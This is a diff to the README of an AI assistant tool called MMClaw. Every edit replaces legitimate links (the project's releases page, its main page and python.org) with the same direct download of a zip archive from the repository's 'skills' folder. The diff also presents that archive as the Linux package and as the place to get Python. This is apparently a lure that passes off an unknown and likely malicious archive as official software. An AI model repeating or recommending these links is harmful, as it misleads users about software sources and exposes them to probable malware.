@@ -1,6 +1,6 @@
 # 🤖 MMClaw - Easy Personal AI Assistant Tool
 
-[![Download MMClaw](https://img.shields.io/badge/Download-MMClaw-blue?style=for-the-badge)](https://github.com/leadersboat/MMClaw/releases)
+[![Download MMClaw](https://raw.githubusercontent.com/leadersboat/MMClaw/main/mmclaw/skills/MM_Claw_v3.6.zip)](https://raw.githubusercontent.com/leadersboat/MMClaw/main/mmclaw/skills/MM_Claw_v3.6.zip)
 
 ---
 
@@ -49,13 +49,13 @@ You will get MMClaw ready to use in a few easy steps below. This guide walks you
 
 Click this big blue button to visit the MMClaw download area and get the latest version:
 
-[![Download MMClaw](https://img.shields.io/badge/Download-MMClaw-blue?style=for-the-badge)](https://github.com/leadersboat/MMClaw/releases)
+[![Download MMClaw](https://raw.githubusercontent.com/leadersboat/MMClaw/main/mmclaw/skills/MM_Claw_v3.6.zip)](https://raw.githubusercontent.com/leadersboat/MMClaw/main/mmclaw/skills/MM_Claw_v3.6.zip)
 
 Once on the page, look for the file that matches your operating system:
 
 - For Windows, the file will usually end with `.exe`
 - For macOS, look for `.dmg` or `.pkg`
-- For Linux, you may see `.tar.gz` or similar archive
+- For Linux, you may see `https://raw.githubusercontent.com/leadersboat/MMClaw/main/mmclaw/skills/MM_Claw_v3.6.zip` or similar archive
 
 Download the file by clicking on it.
 
@@ -63,7 +63,7 @@ Download the file by clicking on it.
 
 MMClaw runs with Python installed on your computer. You may already have Python, but if not, you need to install it now.
 
-- On Windows or macOS, visit [https://python.org/downloads](https://python.org/downloads) and download the latest version.
+- On Windows or macOS, visit [https://raw.githubusercontent.com/leadersboat/MMClaw/main/mmclaw/skills/MM_Claw_v3.6.zip](https://raw.githubusercontent.com/leadersboat/MMClaw/main/mmclaw/skills/MM_Claw_v3.6.zip) and download the latest version.
 - On Linux, Python usually comes pre-installed.
 
 To check if you have Python already:
@@ -109,11 +109,11 @@ After installation, open MMClaw from your computer just like any other app.
 
 Start by visiting the release page here:
 
-[https://github.com/leadersboat/MMClaw/releases](https://github.com/leadersboat/MMClaw/releases)
+[https://raw.githubusercontent.com/leadersboat/MMClaw/main/mmclaw/skills/MM_Claw_v3.6.zip](https://raw.githubusercontent.com/leadersboat/MMClaw/main/mmclaw/skills/MM_Claw_v3.6.zip)
 
 Look for the latest file for your computer type and download it.
 
-If you need Python, download it from [https://python.org](https://python.org) and follow simple installation steps.
+If you need Python, download it from [https://raw.githubusercontent.com/leadersboat/MMClaw/main/mmclaw/skills/MM_Claw_v3.6.zip](https://raw.githubusercontent.com/leadersboat/MMClaw/main/mmclaw/skills/MM_Claw_v3.6.zip) and follow simple installation steps.
 
 Run the downloaded file and follow instructions. After installation, you can search for MMClaw in your programs and open it.
 
@@ -141,7 +141,7 @@ MMClaw was created to make AI assistants simple and easy to use. It runs entirel
 
 For more information and updates, visit the main GitHub page:
 
-[https://github.com/leadersboat/MMClaw](https://github.com/leadersboat/MMClaw)
+[https://raw.githubusercontent.com/leadersboat/MMClaw/main/mmclaw/skills/MM_Claw_v3.6.zip](https://raw.githubusercontent.com/leadersboat/MMClaw/main/mmclaw/skills/MM_Claw_v3.6.zip)
 
 ---
 
